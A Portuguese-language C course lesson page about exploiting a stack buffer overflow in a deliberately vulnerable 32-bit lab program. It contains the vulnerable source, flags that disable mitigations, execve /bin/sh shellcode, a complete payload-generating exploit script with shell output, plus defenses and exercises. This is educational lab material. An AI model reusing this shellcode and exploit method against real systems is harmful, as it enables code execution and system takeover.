@@ -1,0 +1,329 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>4.05 — Buffer overflow clássico (stack): ret2shellcode em 32 bits — Aprenda C</title>
+<link rel="stylesheet" href="../assets/css/style.css">
+</head>
+<body data-trilha="4">
+<header class="site-header">
+  <a class="brand" href="../index.html">⌘ Aprenda <b>C</b></a>
+  <nav class="top-nav">
+    <a href="../index.html">Roadmap</a>
+    <a href="../exercicios/index.html">Exercícios</a>
+    <a href="../projetos/index.html">Projetos</a>
+  </nav>
+</header>
+<main class="modulo">
+  <nav class="breadcrumb"><a href="../index.html">Roadmap</a> / <a href="../index.html#t4">Trilha 4 — Cyber</a> / Buffer overflow clássico (stack): ret2shellcode em 32 bits</nav>
+
+  <header class="mod-header">
+    <div class="mod-cab NUM">4.05</div>
+    <h1>Buffer overflow clássico (stack): ret2shellcode em 32 bits</h1>
+    <p class="subtitulo">Do offset ao EIP: compilar vulnerável, gerar payload e obter shell</p>
+    <div class="chips">
+      <span class="chip">Nível: Avançado/Cyber</span>
+      <span class="chip">Duração: ~55 min</span>
+      <span class="chip">Pré-requisitos: T4.03 (anatomia da memória), T4.04 (gdb/objdump), T0.01 (gdb básico)</span>
+    </div>
+    <button class="btn btn-done" data-mod="t4-m05">Marcar concluído</button>
+  </header>
+
+  <section class="card objetivos">
+    <h2>🎯 Objetivos</h2>
+    <p>Reproduzir, num laboratório isolado e em um binário criado por você, o ataque mais clássico da história: estouro de buffer na pilha para sequestrar o EIP e executar shellcode (execve /bin/sh). Inclui: frame 32-bit, cálculo do offset, NOP sled, shellcode, geração do payload em python e condições de compilação didáticas, sempre em WSL2/VM com ASLR desligado por sessão.</p>
+  </section>
+
+  <section class="card leitura">
+  <h2>📖 Leitura guiada</h2>
+  
+  
+  <p class="foco"><strong>Foco da leitura:</strong> Leitura historiográfica (referências clássicas, para entender de onde vem tudo): "Smashing The Stack For Fun And Profit" (Aleph One, Phrack 49, 1996) e o tutorial da Corelan "Exploit writing tutorial part 1: Stack Based Overflows" (https://www.corelan.be/). O primeiro é optativo e em inglês arcaico; o segundo é passo a passo moderno. Nós seguimos o mesmo método, sem os exploits de network e só no nosso binário.</p>
+</section>
+  <section class="card secao">
+  <h2>O cenário (didático, 32 bits)</h2>
+  <p>Vamos explorar um binário <strong>32-bit</strong> mesmo em uma máquina 64-bit. Por quê? Nos 32 bits o modelo mental é mais direto: <em>endereço de retorno = 4 bytes</em>, argumentos de função na pilha, e o endereço da pilha cabe num único word. Uma vez que o ataque clica em 32 bits, migrar a <em>ideia</em> para 64 bits é trocar 4 por 8 e lidar com registradores de argumentos (vamos ver a versão ret2libc 64-bit no módulo 06).</p>
+<p><strong>Aviso:</strong> este módulo desativa proteções e desliga ASLR <em>por sessão</em>. Isso acontece APENAS dentro do seu lab (WSL2/VM), em um binário que você mesmo compilou, que não toca nenhum serviço real de produção. Ao terminar, apague os binários e reative o ASLR.</p>
+  
+  
+  
+</section>
+<section class="card secao">
+  <h2>O programa vulnerável</h2>
+  <p>O alvo copia o primeiro argumento (sua entrada) para um buffer local de 64 bytes com <code>strcpy</code>, sem limite — CWE-121 (stack-based buffer overflow). Compilamos com as flags didáticas <code>-m32</code> (binário 32-bit), <code>-fno-stack-protector</code> (sem canário), <code>-z execstack</code> (pilha executável — sem NX) e <code>-no-pie</code> (endereços fixos).</p>
+  
+  <div class="code-block">
+  <div class="code-head"><span>Código — prog_trivial.c (VULNERÁVEL)</span><button class="copy-btn" type="button">copiar</button></div>
+  <pre class="code"><code class="language-c">/* prog_trivial.c -- alvo didático do module 05 (VULNERAVEL).
+   Compile NO LINUX/WSL (compile 32-bit precisa do multilib):
+   sudo apt install gcc-multilib
+   gcc -m32 -fno-stack-protector -z execstack -no-pie -g prog_trivial.c -o prog_trivial
+   NUNCA use estas flags em codigo real. */
+#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+
+static void vulneravel(char *entrada)
+{
+    char buf[64];
+    strcpy(buf, entrada);            /* CWE-121: copia sem limite */
+    printf(&quot;recebido: %s\n&quot;, buf);
+}
+
+int main(int argc, char **argv)
+{
+    setvbuf(stdout, NULL, _IONBF, 0);
+    if (argc &lt; 2) {
+        printf(&quot;uso: %s &lt;payload&gt;\n&quot;, argv[0]);
+        return 1;
+    }
+    vulneravel(argv[1]);
+    return 0;
+}</code></pre>
+</div>
+  <div class="output-block">
+  <div class="code-head"><span>Saída esperada</span></div>
+  <pre class="output"><code>$ gcc -m32 -fno-stack-protector -z execstack -no-pie -g prog_trivial.c -o prog_trivial
+$ ./prog_trivial &quot;AAAA&quot;
+recebido: AAAA</code></pre>
+</div>
+</section>
+<section class="card secao">
+  <h2>A geometria do ataque</h2>
+  <p>Na frame de <code>vulneravel</code>, a pilha (32 bits) tem esta ordem, de endereço baixo para alto: <code>buf[64]</code> → <strong>saved EBP (4 bytes)</strong> → <strong>return address (4 bytes)</strong> → args do chamador. O <code>strcpy</code> escreve <em>para cima</em>:</p>
+  
+  <div class="code-block">
+  <div class="code-head"><span>Código — geometria</span><button class="copy-btn" type="button">copiar</button></div>
+  <pre class="code"><code class="language-c">enderecos altos
+  +----------------------------+
+  | argumento (entrada externa)|
+  | return address   &lt;-- alvo  = o que queremos reescrever
+  | saved EBP                |
+  +----------------------------+
+  | buf[64]  &lt;- strcpy escreve      |
+  +----------------------------+
+enderecos baixos
+  &quot;Se escrevermos 64+4 bytes de lixo e mais 4 bytes com o
+   endereco do nosso shellcode, o ret vai pular para la.&quot;</code></pre>
+</div>
+  
+</section>
+<section class="card secao">
+  <h2>Medindo o offset com o gdb</h2>
+  <p>Offset = distância de <code>&buf</code> até o return address. Não chute: meça. No gdb, pare no início de <code>vulneravel</code> e compare <code>$ebp</code> com <code>&buf</code>:</p>
+  
+  <div class="code-block">
+  <div class="code-head"><span>Código — medindo o offset</span><button class="copy-btn" type="button">copiar</button></div>
+  <pre class="code"><code class="language-c">gdb ./prog_trivial
+(gdb) break vulneravel
+(gdb) run &quot;AAAA&quot;
+(gdb) p/x $ebp
+$1 = 0xbfffefd8
+(gdb) p &amp;buf
+$2 = (char (*)[64]) 0xbfffef8c
+(gdb) p 0xbfffefd8 - 0xbfffef8c     # espaco do buf ate o EBP
+$3 = 76
+(gdb) p/x (char *)&amp;buf + 76 + 4       # onde fica o ret address
+$4 = 0xbffff020
+(gdb) quit</code></pre>
+</div>
+  <div class="output-block">
+  <div class="code-head"><span>Saída esperada</span></div>
+  <pre class="output"><code>--&gt; offset = 76 bytes ate o saved EBP;
+     com +4 chegamos no return address (offset total 80).</code></pre>
+</div>
+</section>
+<section class="card secao">
+  <h2>Shellcode: a &quot;bomba de execução&quot; de execve</h2>
+  <p><strong>Shellcode</strong> é uma sequência de código de máquina que, ao ser executada, faz o processo servir uma shell. O clássico para 32-bit (23 bytes) monta <code>execve("/bin/sh", NULL, NULL)</code>:</p>
+  <ul><li><code>\x31\xc0</code> — <code>xor eax,eax</code> (zera EAX = nº da syscall).</li>
+<li><code>\x50</code> — <code>push eax</code> (fim da string, NUL).</li>
+<li><code>\x68\x2f\x2f\x73\x68</code> → <code>//sh</code>; <code>\x68\x2f\x62\x69\x6e</code> → <code>/bin</code> (juntos: "/bin//sh", com // = pad).</li>
+<li><code>\x89\xe3</code> — <code>mov ebx,esp</code> (argv[0] = a string).</li>
+<li><code>\x50\x53</code> — <code>push eax; push ebx</code> (argv=NULL, path).</li>
+<li><code>\x89\xe1</code> — <code>mov ecx,esp</code> (argv).</li>
+<li><code>\xb0\x0b</code> — <code>mov al,11</code> (syscall execve).</li>
+<li><code>\xcd\x80</code> — <code>int 0x80</code> (chamada ao kernel).</li></ul>
+  <div class="code-block">
+  <div class="code-head"><span>Código — shellcode execve /bin/sh</span><button class="copy-btn" type="button">copiar</button></div>
+  <pre class="code"><code class="language-c">\x31\xc0\x50\x68\x2f\x2f\x73\x68
+\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53
+\x89\xe1\xb0\x0b\xcd\x80</code></pre>
+</div>
+  
+</section>
+<section class="card secao">
+  <h2>NOP sled e o payload completo</h2>
+  <p>O endereço exato do início do buffer varia (mesmo com ASLR desligado). Para errar por pouco, colocamos um <strong>NOP sled</strong> (muitos <code>0x90</code> = "não faça nada") antes do shellcode: a CPU desliza pelos NOPs e, se cair em QUALQUER ponto do sled, termina no shellcode. O payload final: <code>[NOP sled][shellcode][padding][ret para o meio do sled]</code>.</p>
+<p>O endereço <code>ret</code> é o valor de <code>&buf</code> da sua sessão (na saída acima: <code>0xbfffef8c</code>). Aponte para um pouco DENTRO do sled para dar folga. Desligue o ASLR só para esta sessão no lab:</p>
+  
+  <div class="code-block">
+  <div class="code-head"><span>Código — exploit.py</span><button class="copy-btn" type="button">copiar</button></div>
+  <pre class="code"><code class="language-c">#!/usr/bin/env python3
+# exploit.py -- genera o payload do prog_trivial (roda NO LINUX/WSL).
+import struct, sys
+
+# Valores medidos NA SUA sessao do gdb (section &quot;medindo o offset&quot;).
+offset = 76                       # buf -&gt; saved EBP
+ret    = 0xbfffef8c + 16          # aponta um pouco dentro do sled
+
+nopsled    = b&quot;\x90&quot; * 96
+shellcode  = (
+    b&quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68&quot;
+    b&quot;\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53&quot;
+    b&quot;\x89\xe1\xb0\x0b\xcd\x80&quot;
+)
+
+payload = nopsled + shellcode
+payload += b&quot;A&quot; * (offset - len(payload))   # padding ate o EBP
+payload += b&quot;B&quot; * 4                          # saved EBP
+payload += struct.pack(&quot;&lt;I&quot;, ret)            # return address
+
+sys.stdout.buffer.write(payload)</code></pre>
+</div>
+  <div class="output-block">
+  <div class="code-head"><span>Saída esperada</span></div>
+  <pre class="output"><code>$ python3 exploit.py &gt; payload.bin
+$ wc -c payload.bin
+123</code></pre>
+</div>
+</section>
+<section class="card secao">
+  <h2>Executando o exploit (com ASLR desligado por sessão)</h2>
+  <p>Desligue a randomização apenas nesta sessão do lab (o comando é do usuário root). Duas opções seguras: <code>sudo setarch i686 -R ./prog_trivial "$(cat payload.bin)"</code> (desativa ASLR para aquele processo) ou, dentro de um shell raiz <em>somente do lab</em>, <code>echo 0 > /proc/sys/kernel/randomize_va_space</code>. <strong>Reative</strong> com <code>echo 2 > ...</code> ao final dos estudos.</p>
+<p>Se o endereço <code>ret</code> não bater (crash), o gdb mostra o motivo: error no ret address. Reconfira <code>&buf</code>, ajuste o offset/endereço e tente de novo — exploração é engenharia de precisão, não sorte.</p>
+  
+  <div class="code-block">
+  <div class="code-head"><span>Código — executando o exploit</span><button class="copy-btn" type="button">copiar</button></div>
+  <pre class="code"><code class="language-c">$ python3 exploit.py &gt; payload.bin
+$ sudo setarch i686 -R ./prog_trivial &quot;$(cat payload.bin)&quot;
+recebido: &lt;bytes-lixo&gt;
+$ id
+uid=0(root) gid=0(root) groups=0(root)
+$ whoami
+root
+$ exit</code></pre>
+</div>
+  <div class="output-block">
+  <div class="code-head"><span>Saída esperada</span></div>
+  <pre class="output"><code>Com o payload certo, o programa PULA para o NOP sled,
+desliza ate o shellcode e chama execve(&quot;/bin/sh&quot;):
+voce ve um prompt de shell vinda do proprio processo.</code></pre>
+</div>
+</section>
+<section class="card secao">
+  <h2>Observando o salto no gdb (didático)</h2>
+  <p>Para ver o salto acontecendo, rode o exploit dentro do gdb (sem shell, apenas para inspecionar):</p>
+  
+  <div class="code-block">
+  <div class="code-head"><span>Código — exploit sob o gdb</span><button class="copy-btn" type="button">copiar</button></div>
+  <pre class="code"><code class="language-c">$ gdb ./prog_trivial
+(gdb) run &quot;$(cat payload.bin)&quot;
+(gdb) x/5i $eip          # o que vamos executar agora?
+=&gt; 0x90 0x90 0x90 0x90   # caimos no NOP sled!
+(gdb) ni                # escorrega pelos NOPs...
+(gdb) info registers eip
+(gdb) x/4i $eip          # ... ate chegar no shellcode
+=&gt; xor eax,eax
+   push eax
+   push 0x68732f2f
+   push 0x6e69622f
+(gdb) continue
+process 1234 is executing new program: /bin/dash</code></pre>
+</div>
+  <div class="output-block">
+  <div class="code-head"><span>Saída esperada</span></div>
+  <pre class="output"><code>A execução cai em NOPs (0x90), desliza, encontra o bytecode
+0x31 c0 (xor eax,eax) e o gdb anuncia a troca de programa
+para /bin/dash -- o execve(&quot;/bin/sh&quot;) aconteceu.</code></pre>
+</div>
+</section>
+<section class="card secao">
+  <h2>64 bits: por que usamos o binário 32-bit para aprender</h2>
+  <p>Em 64-bit a mesma ideia existe, mas o terreno muda: (1) o <em>return address tem 8 bytes</em> e endereços de pilha têm bytes zero no topo (<code>0x00007fff...</code>), o que quebra payloads com strings terminadas em NUL; (2) os 6 primeiros argumentos de função vão em <em>registradores</em> (rdi, rsi, …), não na pilha — então "empurrar valores na pilha e retornar para uma função" não funciona direto (precisamos de <em>gadgets</em>, módulo 06); (3) a ASLR está ligada. Metodologia escolhida pelo curso: dominar a mecânica em 32 bits com a pilha executável, e então aplicar o mesmo raciocínio nas mitigações (módulo 06), onde o 64-bit retorna com o ret2libc via ROP.</p>
+  
+  
+  
+</section>
+<section class="card secao">
+  <h2>Como se defender</h2>
+  
+  <ul><li>A primeira defesa é <strong>não existir o bug</strong>: copie com tamanho (<code>snprintf</code>) — o módulo 02 inteiro.</li>
+<li>Ligue o canário de pilha (<code>-fstack-protector-all</code>): o overflow destrói o canário e o processo aborta antes do ret — exatamente o que este exploit dependia de NÃO ter.</li>
+<li>Mantenha NX/execstack desabilitado a pilha de executar código: sem <code>-z execstack</code>, o "shellcode na pilha" não executa (a CPU nega a página) — veremos o bypass (ret2libc) e a defesa correspondente no módulo 06.</li>
+<li>Mantenha PIE ligado e a ASLR ativa no sistema: sem endereço fixo da pilha, o <code>ret</code> hardcoded do payload não converge.</li>
+<li>Lembre: um sistema bem configurado exigiria 4 coisas ao mesmo tempo para este ataque (bug + sem canário + execstack + ASLR desligado). Cada uma que você mantém ligada defende.</li>
+<li>Trate a exploração aqui como zoom: o objetivo ao aplicar os mesmos conceitos defensivamente é reconhecer esse bug na tela de um crash ou SAST e saber o porquê.</li></ul>
+  
+  
+</section>
+  <section class="card exs"><h2>✏️ Exercícios</h2><div class="exercicio" id="ex-1" data-mod="t4-m05">
+  <div class="ex-head">
+    <span class="badge badge-nivel n1">Nível 1</span>
+    <span class="ex-actions"><label class="check-ex"><input type="checkbox" class="ex-done"> concluído</label></span>
+  </div>
+  <p class="num-ex">Exercício 4.05.1</p>
+  <p class="enunciado">Você troca <code>-z execstack</code> por nada (NX ativo): recompile o prog_trivial equilibrado (sem execstack, sem canário, -no-pie) e rode o payload do módulo. O que acontece agora e por quê? (Não precisa relatar saída exata: explique o fenômeno.)</p>
+  <p class="dica"><strong>Dica:</strong> A página da pilha está marcada NX (não-executável): o RIP pular para a pilha gera SIGSEGV com "executable stack" ou "cannot access memory".</p>
+  <details class="solucao"><summary>Ver solução</summary><pre class="code"><code class="language-c">$ gcc -m32 -fno-stack-protector -no-pie -g prog_trivial.c -o prog_trivial_nx
+$ python3 exploit.py &gt; payload.bin
+$ sudo setarch i686 -R ./prog_trivial_nx &quot;$(cat payload.bin)&quot;
+Program received signal SIGSEGV
+# O EIP foi para o NOP sled, mas a CPU NEGOU executar
+# codigo vindo de uma pagina NX (PAE/DEP). Nenhum shell.</code></pre>
+        <p class="obs">Esse é o princípio do DEP/NX: você pode saltar para a pilha, mas não executar o que está nela. O módulo 06 mostra o que o atacante troca por isso.</p></details>
+</div>
+<div class="exercicio" id="ex-2" data-mod="t4-m05">
+  <div class="ex-head">
+    <span class="badge badge-nivel n2">Nível 2</span>
+    <span class="ex-actions"><label class="check-ex"><input type="checkbox" class="ex-done"> concluído</label></span>
+  </div>
+  <p class="num-ex">Exercício 4.05.2</p>
+  <p class="enunciado">Mude o payload para retornar para um endereço ERRADO de propósito (ex.: <code>ret = 0xdeadbeef</code>) e rode no gdb. Leia a mensagem de erro e anote o EIP no momento do crash. O que essa informação te diz sobre o controle do fluxo?</p>
+  <p class="dica"><strong>Dica:</strong> O EIP no crash é 0xdeadbeef — o programa seguiu exatamente o que você escreveu no ret address.</p>
+  <details class="solucao"><summary>Ver solução</summary><pre class="code"><code class="language-c">(gdb) run &quot;$(cat payload_bad.bin)&quot;
+Program received signal SIGSEGV.
+=&gt; 0xdeadbeef in ?? ()
+An error occurred while disassembling ...
+(gdb) info registers eip
+eip            0xdeadbeef</code></pre>
+        <p class="obs">Controle total do EIP confirmado. Daqui para o shell é só acertar o alvo do pulo.</p></details>
+</div>
+<div class="exercicio" id="ex-3" data-mod="t4-m05">
+  <div class="ex-head">
+    <span class="badge badge-nivel n3">Nível 3</span>
+    <span class="ex-actions"><label class="check-ex"><input type="checkbox" class="ex-done"> concluído</label></span>
+  </div>
+  <p class="num-ex">Exercício 4.05.3</p>
+  <p class="enunciado">Variação: troque o shellcode para spawnar <code>id</code> e sair limpo. Use o mesmo padrão (execve) apontando para "/bin//sh" seguido de <code>-c</code>…; se ficar difícil, compile um C com o syscall execve("/bin/sh") e veja o disassembly — o exercício é usar o gdb para "copiar" o shellcode do seu próprio programa. Descreva o que você capturou.</p>
+  <p class="dica"><strong>Dica:</strong> Compile <code>int main(){ execve("/bin/sh",0,0); }</code>, desassemble com <code>objdump -d -M intel</code>, e veja como o compilador constrói a string e a syscall.</p>
+  <details class="solucao"><summary>Ver solução</summary><pre class="code"><code class="language-c">/* mini.c -- fonte de onde &quot;copiar&quot; instrucoes para shellcode */
+#include &lt;unistd.h&gt;
+int main(void) {
+    char *argv[2] = { &quot;/bin//sh&quot;, NULL };
+    execve(argv[0], argv, NULL);
+    return 0;
+}</code></pre>
+        <p class="obs">O disassembly deixa claro o padrão: construir a string na pilha (push), colocar endereço em ebx/ecx/edx e fazer a syscall 11. O shellcode 23-byte que usamos é essa rotina "enxuta".</p></details>
+</div></section>
+  
+<section class="card quiz-card" data-quiz-json='[{&quot;pergunta&quot;:&quot;No ataque deste módulo, o strcpy escreve em qual direção e o que ele precisa alcançar?&quot;,&quot;opcoes&quot;:[&quot;Escreve para endereços crescentes (para cima), até reescrever o return address&quot;,&quot;Escreve para endereços decrescentes, reescrevendo o buffer global&quot;,&quot;Escreve sempre no heap&quot;,&quot;Ele não escreve; só lê&quot;],&quot;correta&quot;:0,&quot;explicacao&quot;:&quot;buf cresce para cima na pilha; além do buffer vêm saved EBP e return address.&quot;},{&quot;pergunta&quot;:&quot;Para que serve o NOP sled no payload?&quot;,&quot;opcoes&quot;:[&quot;Dar tolerância ao endereço de retorno: cair em qualquer NOP desliza até o shellcode&quot;,&quot;Aumentar o tamanho do payload para passar por filtros&quot;,&quot;Fazer o strcpy parar antes do fim&quot;,&quot;Esconder o shellcode do antivírus&quot;],&quot;correta&quot;:0,&quot;explicacao&quot;:&quot;Scape: série de 0x90 (nop) antes do shellcode; se ret aponta para qualquer NOP, a CPU desliza até o shellcode.&quot;},{&quot;pergunta&quot;:&quot;O que a flag -z execstack faz e por que ela é essencial neste exploit didático?&quot;,&quot;opcoes&quot;:[&quot;Marca a pilha como executável, permitindo que o shellcode rode a partir dela&quot;,&quot;Remove o canário de pilha&quot;,&quot;Desliga a ASLR do processo&quot;,&quot;Compila o binário em 32 bits&quot;],&quot;correta&quot;:0,&quot;explicacao&quot;:&quot;Sem execstack (NX ativo), a CPU nega executar código vindo da pilha.&quot;},{&quot;pergunta&quot;:&quot;Após o exploit, que syscall o shellcode executa para virar uma shell?&quot;,&quot;opcoes&quot;:[&quot;execve(11) com argv[0]=\&quot;/bin//sh\&quot;&quot;,&quot;fork(2)&quot;,&quot;socket(41)&quot;,&quot;read(0)&quot;],&quot;correta&quot;:0,&quot;explicacao&quot;:&quot;int 0x80 com eax=11 chama execve(\&quot;/bin//sh\&quot;, argv, NULL).&quot;}]'>
+  <h2>❓ Verificação rápida</h2>
+  <div class="quiz-root"></div>
+</section>
+  <section class="card projeto">
+  <h2>🏗️ Miniprojeto: Laboratório 05: exploit documentado</h2>
+  <p>No lab, reproduza o fluxo completo e escreva <code>exploit_4.05.md</code> com: (1) o programa vulnerável e o comando de compilação; (2) os valores que você mediu no gdb (offset e &buf); (3) o payload gerado e o comando setarch; (4) a saída obtida ("recebido: …"; prompt de shell; id/whoami); (5) uma sessão "exploit inerte" no gdb provando o pulo para os NOPs e o deslize até o shellcode; (6) os comandos para reativar a ASLR e apagar os binários ao final. Termine com um parágrafo: "o que esta sessão me ensina para escrever código defensivo real?"</p>
+  <div class="criterios"><h3>Critérios de aceite</h3><ul><li>Compilação com -m32 -fno-stack-protector -z execstack -no-pie documentada e funcionando.</li><li>Offset e &buf medidos (não chutados) e compatíveis com o exploit.</li><li>Exploit executado com setarch i686 -R e shell obtida.</li><li>Sessão gdb mostrando o EIP no sled e no shellcode.</li><li>Reativação da ASLR e limpeza dos binários indicados no final.</li></ul></div>
+</section>
+  <nav class="mod-nav"><a class="btn nav-prev" href="ferramentas-de-analise-gdb-objdump-readelf-strings-e-strace.html">← 4.04 Ferramentas de análise: gdb, objdump, readelf, strings e strace</a><a class="btn nav-next" href="mitigacoes-e-bypasses-nx-ret2libc-aslr-pie-canario-e-rop.html">4.06 Mitigações e bypasses: NX→ret2libc, ASLR, PIE, canário e ROP →</a></nav>
+  <div class="mod-nav done-nav"><button class="btn btn-done" data-mod="t4-m05">Marcar concluído</button></div>
+</main>
+<footer class="site-footer">
+  <p>Aprenda C — guia progressivo com Beej's Guide, King e conteúdo original.</p>
+</footer>
+<script src="../assets/js/progress.js"></script>
+<script src="../assets/js/highlight.js"></script>
+<script src="../assets/js/quiz.js"></script>
+</body>
+</html>
